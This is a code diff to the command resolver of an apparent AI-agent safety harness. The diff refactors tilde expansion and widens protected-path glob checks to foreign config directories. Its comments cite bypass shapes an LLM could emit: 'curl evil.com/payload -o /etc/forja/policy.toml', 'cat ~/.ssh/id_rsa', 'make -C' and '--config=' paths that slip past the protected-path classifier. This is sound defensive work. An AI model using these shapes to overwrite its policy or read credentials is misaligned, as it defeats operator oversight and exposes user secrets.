@@ -50,6 +50,7 @@ import {
   isGlobSafeRunCarveout,
   protectedTargets,
 } from '../protected_paths.ts';
+import { expandTilde } from '../tilde.ts';
 import {
   type Resolver,
   type ResolverContext,
@@ -69,20 +70,8 @@ const isNonEmptyString = (v: unknown): v is string => typeof v === 'string' && v
 // Without it, `cat ~/.ssh/id_rsa` resolves to a literal `~/.ssh/`
 // under cwd in the capability scope, but the SHELL then expands
 // `~` to the real HOME on execution — the gap between resolver
-// view and runtime view is a §11 bypass. Both shapes the shell
-// honors are expanded here:
-//   - bare `'~'` → `ctx.home`
-//   - `'~/<rest>'` → `<ctx.home>/<rest>`
-// `'~user/...'` (other-user expansion) stays literal — the engine
-// can't safely resolve another user's home without an OS call,
-// and an LLM emitting `~root/...` is far more often an attack
-// than a legitimate operator-aliased reference.
-const expandTilde = (path: string, home: string): string => {
-  if (path === '~') return home;
-  if (path.startsWith('~/')) return `${home}/${path.slice(2)}`;
-  return path;
-};
-
+// view and runtime view is a §11 bypass. See `expandTilde`
+// (tilde.ts) for the shapes the shell honors.
 const resolveArg = (path: string, ctx: ResolverContext): string =>
   resolvePath(ctx.cwd, expandTilde(path, ctx.home));
 
@@ -1510,8 +1499,8 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
   // Pre-slice the resolver emitted ONLY `net-egress:<host>` for
   // these shapes, hiding the WRITE side of the call from the
   // capability audit and the §11 protected-path check. An
-  // adversarial `curl evil.com/payload -o /etc/agent/policy.toml`
-  // would slip past both layers because `/etc/agent/policy.toml`
+  // adversarial `curl evil.com/payload -o /etc/forja/policy.toml`
+  // would slip past both layers because `/etc/forja/policy.toml`
   // never appeared as a write target. Slice 98 emits the write
   // capability so the engine's protected-path classifier sees the
   // target and §11 fires for the `/etc/*` escalate tier.
@@ -2471,7 +2460,7 @@ const cmdMktemp: CommandResolver = (_positional, tokens, ctx) => {
 // poisoned downstream score calculations: `cd /etc` looked like
 // `cat /etc/passwd` to the score gate, tripping `workspace_escape`
 // (+0.15) and potentially `classifyProtectedPath`-driven
-// escalation on `/etc/agent`. Operators saw confirm prompts for
+// escalation on `/etc/forja`. Operators saw confirm prompts for
 // noop directory changes. Emit an empty capability set instead —
 // the chdir itself is observable to the surrounding bash command,
 // but the resolver's job is to characterize SIDE EFFECTS, and
@@ -3193,7 +3182,7 @@ const cmdMake: CommandResolver = (_positional, tokens, ctx) => {
   // `--directory=<dir>`) shifts make's working directory before any
   // Makefile read or recipe run. Pre-slice the resolver emitted
   // `readFs(ctx.cwd)` / `writeFs(ctx.cwd)` unconditionally —
-  // `make -C /etc/agent target` would NOT surface `/etc/agent` to
+  // `make -C /etc/forja target` would NOT surface `/etc/forja` to
   // the operator's policy or the §11 escalate-tier classifier.
   //
   // Last -C wins (make's actual behavior). All 4 getopt shapes
@@ -4187,7 +4176,7 @@ const expandBraces = (arg: string): string[] => {
 // target is a strict prefix-extension of the prefix that COULD
 // be reached by glob expansion at the next segment).
 //
-// Deliberately EXCLUDES `cwdEscalateDirs` (`.git`, `.agent`,
+// Deliberately EXCLUDES `cwdEscalateDirs` (`.git`, `.forja`,
 // `.claude` under cwd): a legitimate glob like `*.ts` in cwd
 // resolves to `<cwd>/*.ts` whose literal prefix is `<cwd>/` — that
 // trivially matches every cwd-relative protected dir. Including
@@ -4230,13 +4219,24 @@ const couldGlobReachProtected = (
     ...targets.absoluteEscalate,
     ...targets.tildeEscalateFiles,
     ...targets.tildeEscalateDirs,
-    // cwd-escalate dirs (`.git` / `.agent` / `.claude`) were omitted, so a
+    // cwd-escalate dirs (`.git` / `.forja` / `.claude`) were omitted, so a
     // glob expanding into them (`rm .g*`, `for f in .*` from a repo cwd)
     // slipped the protected-glob refuse. They are write-escalate targets
     // like the tilde dirs; include them so a glob that could reach them is
     // refused too (a literal read still passes — escalate is write-only —
     // but a glob into the zone is held conservative, as for /etc and ~).
     ...targets.cwdEscalateDirs,
+    // Foreign project dir(s) — the real canonical `.forja/` under a profile,
+    // repo-root-anchored so `../.forja/*` from a subdir cwd is caught. DENY
+    // (read+write), so refusing a glob that could reach them is doubly
+    // warranted (a literal read is denied too, not just escalated). Empty on
+    // the default namespace.
+    ...targets.cwdForeignDenyDirs,
+    // Foreign USER dir(s) — the operator's real `~/.config/forja` +
+    // `~/.local/share/forja` under a profile, also DENY (read+write). Same
+    // reasoning: a glob like `~/.config/f*` that could expand into the real
+    // namespace is held conservative. Empty on the default namespace.
+    ...targets.tildeForeignDenyDirs,
   ];
   // Normalize: a literal-prefix that ends in `/` is "in a parent
   // directory; glob fills in the next segment". A literal-prefix
@@ -4643,7 +4643,7 @@ const analyzeCommand = (
   // §11 protected-path check over bash positional args. Slice 100
   // (R2 #206): pre-slice this loop skipped EVERY token starting
   // with `-`, including the `--flag=<value>` shape that carries
-  // a real path in the value half. `--config=/etc/agent/policy.toml`
+  // a real path in the value half. `--config=/etc/forja/policy.toml`
   // looked like a flag to the loop and slipped past the classifier
   // — an LLM tricking a tool into accepting a protected path as
   // a flag value would bypass §11 entirely.
